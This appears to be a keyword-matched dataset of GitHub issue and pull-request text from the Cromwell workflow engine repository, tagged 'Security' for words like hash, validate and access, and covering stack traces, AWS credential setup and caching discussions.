Security,"Please check this issue.; I think this issue is another problem . > Caused by: common.exception.AggregatedMessageException: Error(s):; > Could not evaluate expression: write_lines(array_of_files): Access Denied (Service: S3Client; Status; > Code: 403; Request ID: CB48F5CFE95BBD50); > at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:68); > at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:64); > at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExe; > cutionActor.scala:563); > ... 31 common frames omitted; > [2019-01-09 05:21:48,83] [error] WorkflowManagerActor Workflow fb387147-f98a-4397-92b3-700d8c607a45 f; > ailed (during ExecutingWorkflowState): java.lang.RuntimeException: AwsBatchAsyncBackendJobExecutionAc; > tor failed and didn't catch its exception.; > at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrE; > lse(StandardSyncExecutionActor.scala:183); > at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrE; > lse(StandardSyncExecutionActor.scala:180); > at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:298); > at akka.actor.dungeon.FaultHandling.handleFailure(FaultHandling.scala:263); > at akka.actor.dungeon.FaultHandling.handleFailure$(FaultHandling.scala:254); > at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); > at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); > at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); > at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); > at akka.dispatch.Mailbox.run(Mailbox.scala:224); > at akka.dispatch.Mailbox.exec(Mailbox.scala:235); > at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > at akka.dispatch.forkjo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-452577365:197,Access,Access,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-452577365,9,"['Access', 'Validat', 'validat']","['Access', 'Validation', 'ValidationTry', 'validation']"
Security,"Please check this issue.; When I configure the aws, I followed up this page. (https://docs.opendata.aws/genomics-workflows/; ); I did not use the all-in-one template. With 3 step configure, I setup the cromwell server (Custom AMI -> VPC..and etc -> cromwell server instance). <!-- Which backend are you running? -->; aws. <!-- Paste/Attach your workflow if possible: -->; ```; task echoHello{; command {; echo ""Hello AWS!""; }; runtime {; docker: ""ubuntu:latest""; }. }. workflow printHelloAndGoodbye {; call echoHello; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; [cromwell-server.log](https://github.com/broadinstitute/cromwell/files/2897001/cromwell-server.log)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4677:587,PASSWORD,PASSWORDS,587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4677,1,['PASSWORD'],['PASSWORDS']
Security,Please hold on to this thought! I think the responsibility of that shouldn't lie with the ValidateActor!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197500994:90,Validat,ValidateActor,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197500994,1,['Validat'],['ValidateActor']
Security,Please say your image hash e.g. `87-xxxxxxx` and backend (which I assume is Batch).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239490428:22,hash,hash,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239490428,1,['hash'],['hash']
Security,Please take a look here https://cloud.google.com/logging/docs/audit,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685812146:62,audit,audit,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685812146,1,['audit'],['audit']
Security,Poor womtool validate output (engine function),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4042:13,validat,validate,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4042,1,['validat'],['validate']
Security,Poor womtool validate output (error formatter),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4041:13,validat,validate,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4041,1,['validat'],['validate']
Security,PortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.Set$Set1.foreach(Set.scala:97); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at wom.views.GraphPrint$.upstreamLinksforNode$1(GraphPrint.scala:190); 	at wom.views.GraphPrint$.relevantAsUpstream$1(GraphPrint.scala:176); 	at wom.views.GraphPrint$.upstreamPortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.HashSet$HashSet1.foreach(HashSet.scala:321); 	at scala.collection.immutable.HashSet$HashTrieSet.foreach(HashSet.scala:977); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at wom.views.GraphPrint$.upstreamLinksforNode$1(GraphPrint.scala:190); 	at wom.views.GraphPrint$.upstreamLinks(GraphPrint.scala:191); 	at wom.views.GraphPrint.$anonfun$listAllGraphNodes$2(GraphPrint.scala:33); 	at scala.collection.Iterator$$anon$10.next(Iterator.scala:459); 	at scala.collection.Iterator.foreach(Iterator.scala:941); 	at scala.collection.Iterator.foreach$(Iterator.scala:941); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); 	at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:160); 	at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:158); 	at scala.collection.AbstractIterator.foldLeft(Iterator.scala:1429); 	at cats.kernel.Monoid.combineAll(Monoid.scala:82); 	at cats.kernel.Monoid.comb,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6744:3534,Hash,HashSet,3534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6744,1,['Hash'],['HashSet']
Security,Preliminary validation of workflow options,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2295:12,validat,validation,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2295,1,['validat'],['validation']
Security,"Previously, if a docker image was named ""docker.io/<repo>/<imageName>:<tag>"", there was an issue such that Cromwell failed to pull the docker hash. The job was allowed to run but the results were never saved and so one could never call-cache to jobs with that kind of docker syntax. . This change is meant to make ""docker.io"" an accept hostname for the DockerHubFlow.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3178:142,hash,hash,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3178,1,['hash'],['hash']
Security,"Previously:; ```; ""hashDifferential"": [; { ""output expression:String hi”: ; {; ""callA"": ""935C6E7EB2068B83C40B788575747EFB”, ; ""callB"": “0183144CF6617D5341681C6B2F756046""; }; },; …; ]; ```. This PR :; ```; ""hashDifferential"": [; ""hashKey"": ""output expression:String hi"",; ""callA"": ""935C6E7EB2068B83C40B788575747EFB"",; ""callB"": ""0183144CF6617D5341681C6B2F756046""; },; ...; ]; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471:19,hash,hashDifferential,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471,3,['hash'],"['hashDifferential', 'hashKey']"
Security,Probably linked to https://github.com/broadinstitute/cromwell/issues/1886; Retrying credentials validation here https://github.com/broadinstitute/cromwell/blob/develop/filesystems/gcs/src/main/scala/cromwell/filesystems/gcs/auth/GoogleAuthMode.scala#L66 should fix all those issues,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270#issuecomment-301503310:96,validat,validation,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270#issuecomment-301503310,1,['validat'],['validation']
Security,Probably not as horrible as it sounds. Use BQ to determine how many files appear as inputs to calls for a $5 workflow run and how many times each appears over the course of the entire workflow. If files are appearing multiple times we could implement a cache of file hashes to prevent needlessly requesting the hashes for files multiple times.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4096:267,hash,hashes,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4096,2,['hash'],['hashes']
Security,"Probably worth distinguishing the difference between the server instance and individual job instances. Each can get independent access permissions. I can see the need for job instances to be able to read from various input sources, including those not owned by the account. Does the server, i.e. the Cromwell process, need to read data across accounts as well? I was under the impression that it only needed to track status and logs for workflows and jobs submitted to it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-501247084:128,access,access,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-501247084,1,['access'],['access']
Security,"Proposed high-level flow:. Workflows + inputs + options are submitted. Any grossly malformed submission would quickly generate an error returned to the client immediately. Otherwise save everything to WORKFLOW_EXECUTION and WORKFLOW_EXECUTION_AUX at status Submitted, and return the generated UUID to the client. THAT’S IT. Do not validate workflows synchronously to submission, that’s expensive and difficult to throttle back. The returned UUID constitutes a pollable handle for the submission. Technically this UUID is now a submission ID rather than a workflow ID, though if the workflow is eventually validated that UUID could certainly be thought of as the workflow ID. When Cromwell is ready to validate a submission, the status of the WORKFLOW_EXECUTION can be moved to Validating and validation initiated. Assuming the validation succeeds the workflow would move to state Validated. Again when Cromwell is ready to run the workflow, it can be moved to state Running and the workflow would begin to run. Workflows that fail validation would get status Failed with text describing the nature of the failures in the FAILURE_MESSAGES table.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/564:331,validat,validate,331,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/564,8,"['Validat', 'validat']","['Validated', 'Validating', 'validate', 'validated', 'validation']"
Security,"Proposed in the [PR for HTTPS imports](https://github.com/broadinstitute/cromwell/pull/2758) by @kcibul:. As a **user configuring Cromwell**, I want **the option to disable HTTPs imports**, so that **I can protect my system from possible security risks**. - Effort: Small; - Risk: Small; - Business value: Medium",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2773:238,secur,security,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2773,1,['secur'],['security']
Security,Provider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19]; at scala.collection,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:2903,hash,hash,2903,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['hash'],['hash']
Security,Pull request for #BA-5929 issue:; https://broadworkbench.atlassian.net/browse/BA-5929. Changes:; Implemented store larger values in WomFloat type via changing Double implementation to BigDecimal.; Also added validation logic of type compatibility.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5203:208,validat,validation,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5203,1,['validat'],['validation']
Security,"Question on using the default authentication for AWS. Basically I have a credentials file saved to *~/.aws/credentials* and it is looked up by cromwell for authentication to use the AWS batch service. For scalability I wanted to include a few different profiles to look up. *~/.aws/credentials*; ```; [service1]; aws_access_key_id = key1; aws_secret_access_key = pw1. [service2]; aws_access_key_id = key2; aws_secret_access_key = pw2; ```. However, I cannot seem to get cromwell config to set a profile name for `service2` as the expected authentication. The only profile it will look for is `default`. From my config it is set up as follows:. ```; aws {; application-name = ""CROMWELL-SERVER""; auths = [{; name = ""service2""; scheme = ""default""; }]. region = ""us-east-1""; }; ```. The error when I try to run a job is below which shows I am using a `profileName=default`. Looked through the code a bit but couldn't find where I can add that profilename to the config. If there is a way to change the profile name I would definitely use it, if not then I can set things up differently. Thanks. `cromwell_1 | Caused by: software.amazon.awssdk.core.exception.SdkClientException: Unable to load credentials from any of the providers in the chain AwsCredentialsProviderChain(credentialsProviders=[SystemPropertyCredentialsProvider(), EnvironmentVariableCredentialsProvider(), ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])), ContainerCredentialsProvider(), InstanceProfileCredentialsProvider()]) : [SystemPropertyCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., EnvironmentVariableCredentialsProvider(): Unable to load credentials from system settings. Access key must be",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:30,authenticat,authentication,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,3,['authenticat'],['authentication']
Security,Quick file hashing cancellation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1503:11,hash,hashing,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1503,1,['hash'],['hashing']
Security,"Quoting @geoffjentry from earlier comment so that it's not lost:. > @gauravs90 I've generally seen the akka folks recommend directly passing references to actors which need to be used. That has multiple benefits (e.g. makes it easy to switch out and/or dep injection, etc). My off the cuff reaction is that that seems simpler to just pass the required reference around, although I'll admit I'm basing that purely on your description and not having looked at the changes yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218895676:257,inject,injection,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218895676,2,['inject'],['injection']
Security,REST API access to stdout and stderr files,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2928:9,access,access,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2928,1,['access'],['access']
Security,REST API query endpoint status param values are validated case-insensitively but checked for equality case-sensitively,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1514:48,validat,validated,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1514,1,['validat'],['validated']
Security,REST API submission validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1515:20,validat,validation,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1515,1,['validat'],['validation']
Security,"Random google-r checking in, I had some similar confusion with CWL and InitialWorkDirRequirements and although it's not directly related to this issue as I wasn't replicating with docker, I wanted to comment in case anyone else finds themselves here, especially within Cromwell. My confusion can because I had a CommandLineTool that would only generate its files where the inputs are. Basically I needed to localise the file to the execution directory, and then reference it in a glob expression on output. TL;DR, put the InitialWorkDirRequirement file expression in a `Dirent` rather than on the requirement. By _carefully_ re-reading the [`InitialWorkDirRequirement`](https://www.commonwl.org/v1.0/Workflow.html#InitialWorkDirRequirement).[`Dirent`](https://www.commonwl.org/v1.0/Workflow.html#InitialWorkDirRequirement) documentation, we find:. #### InitialWorkDirRequirement.listing; > May be an expression. If so, the expression return value must validate as {type: array, items: [File, Directory]}. This is what I initially did, which looks like:; ```yaml; requirements:; InitialWorkDirRequirement:; listing: $([inputs.inputFile]); ```; but my output expression was never localised to this new directory. Let's look at Dirent:. #### Dirent.entry; > If the value is an expression that evaluates to a File object, this indicates the referenced file should be added to the designated output directory prior to executing the tool. Okay cool, this is basically what I want, and paired with:. #### Dirent.entryname; > The name of the file or subdirectory to create in the output directory. If entry is a File or Directory, the entryname field overrides the value of basename of the File or Directory object. Optional. This is exactly what I want. I need to provide the expression for Dirent.entry, and exclude entryname, and Cromwell successfully localises this. Hence putting this together so that a tabix CommandLineTool can generate the file in the following CommandLineTool:. ```cwl; class: Comman",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3639#issuecomment-452514774:952,validat,validate,952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3639#issuecomment-452514774,1,['validat'],['validate']
Security,"Re this PR, I'm re-working it to pass all of the task call-specific monitoring info (workflow name/id, task call name/index/attempt, `inputs`, `disks`, and the opaque image-specific `monitoringConfig` string) through a JSON config file on GCS (thanks @kshakir for the idea!). This way, we no longer have to use environmental variables, and can pass much more data than can be held in a variable (looking at you, `inputs`!). That still has a potential problem of running against the API quota for GCS, but since we already access multiple files from that execution bucket inside the task, the assumption is that accessing one extra file won't hurt. However, I'm unsure if we should just get rid of all of the environmental variables in favor of one that points to the GCS URL of the JSON config, or should we keep them (and thus duplicate information) for backwards compatibility. AFAIK, hardly anyone used this feature yet, especially given that the current ""official"" `monitoring_image` has been essentially broken, because Google decided to start failing Stackdriver Monitoring requests if they are submitted more than 1/minute, for a given time series. We should fix the `monitoring_image` separately (or replace it with the BigQuery version), but the question remains whether we still want to keep those env vars around for that previous use case (for anyone who might've been using a custom `monitoring_image` already). Alternatively, we could pass only the `inputs` and `monitoringConfig` through a JSON blob on GCS, and continue with the rest as-is via env vars (but that's messy, IMO).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502266400:522,access,access,522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502266400,2,['access'],"['access', 'accessing']"
Security,Re-pin the conformance hash and fix the most recently added CWL conformance test by creating a directory for Directories without a `path` or `location`.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3649:23,hash,hash,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3649,1,['hash'],['hash']
Security,Recover from Docker image hash failures to fail the workflow.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/333:26,hash,hash,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/333,1,['hash'],['hash']
Security,Reduce hash cost of WdlSyntaxErrorFormatter,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3965:7,hash,hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3965,1,['hash'],['hash']
Security,Reduce hashcode work in file hashing actor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2555:7,hash,hashcode,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2555,2,['hash'],"['hashcode', 'hashing']"
Security,Reduce hashing closes #1603,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1613:7,hash,hashing,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1613,1,['hash'],['hashing']
Security,"Refactored from its original version, this creates the structure to support multiple access token strategies but does not bring in the logic from BT-426 to actually get an access token for Azure. That latter bit is now the subject of a separate ticket BT-436.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6553:85,access,access,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6553,2,['access'],['access']
Security,Refactoring of Jes configuration validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/201:33,validat,validation,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/201,1,['validat'],['validation']
Security,Refactoring of Jes configuration validation V2 (Rebranched from develop),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/208:33,validat,validation,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/208,1,['validat'],['validation']
Security,Refactorings to pass data access into the backend.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/199:26,access,access,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/199,1,['access'],['access']
Security,Reinstating member access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2947:19,access,access,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2947,1,['access'],['access']
Security,Remove docker hash calculations,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1317:14,hash,hash,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1317,1,['hash'],['hash']
Security,Remove hashcode from JobOutput,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/907:7,hash,hashcode,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/907,1,['hash'],['hashcode']
Security,Remove validation from WorkflowDescriptor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/570:7,validat,validation,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/570,1,['validat'],['validation']
Security,Removed docker registry lookups and hashing. Closes #1317,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1338:36,hash,hashing,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1338,1,['hash'],['hashing']
Security,Removed hashes from JobOutputs. Closes #907,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1174:8,hash,hashes,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1174,1,['hash'],['hashes']
Security,Removed security tags from cromwell and fixed tags in cromiam.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3797:8,secur,security,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3797,1,['secur'],['security']
Security,Removed validation endpoint. Closes #647,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/697:8,validat,validation,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/697,1,['validat'],['validation']
Security,Render secure resources for publish creds.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4067:7,secur,secure,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4067,1,['secur'],['secure']
Security,"Replaces KeyVault shim with real Azure credentials for accessing DRS files. Cromwell's engine and CromwellDrsLocalizer had parallel token-generating classes for GCP and Azure. The GCP behavior is different in the two cases but Azure is the same. I collapsed them into a single `DrsCredentials` trait with two different GCP-related implementations. This involved a lot of renaming in https://github.com/broadinstitute/cromwell/pull/6952/commits/f34a54c16b5ed5a25cd099b7ce60d75010a3b8d7, that's the commit to skip if you want to see a less messy diff.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6952:55,access,accessing,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6952,1,['access'],['accessing']
Security,Report this bug! Static validation failed.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863:24,validat,validation,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863,1,['validat'],['validation']
Security,Request for a centaur test to validate that this is doing what you expect,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3966#issuecomment-410081690:30,validat,validate,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3966#issuecomment-410081690,1,['validat'],['validate']
Security,Request the gsUri first and then maybe request an accessUrl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6319:50,access,accessUrl,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6319,1,['access'],['accessUrl']
Security,Requesting reviews from:; - @kshakir because you created the values being exposed; - @rsasch to make sure adding new fields to `/query` won't play badly with Job Manager,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4831#issuecomment-482738687:74,expose,exposed,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4831#issuecomment-482738687,1,['expose'],['exposed']
Security,Retries for AccessDeniedException just slow progress,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961:12,Access,AccessDeniedException,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961,1,['Access'],['AccessDeniedException']
Security,Retrieve ECR image hashes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3822:19,hash,hashes,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3822,1,['hash'],['hashes']
Security,Retry on failures to get access token,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4272:25,access,access,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4272,1,['access'],['access']
Security,Reuse output hashes for scatter collection Closes #836,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/853:13,hash,hashes,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/853,1,['hash'],['hashes']
Security,Revert: Temporary patch: Use an encrypted variable for the vault token.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4585:32,encrypt,encrypted,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4585,1,['encrypt'],['encrypted']
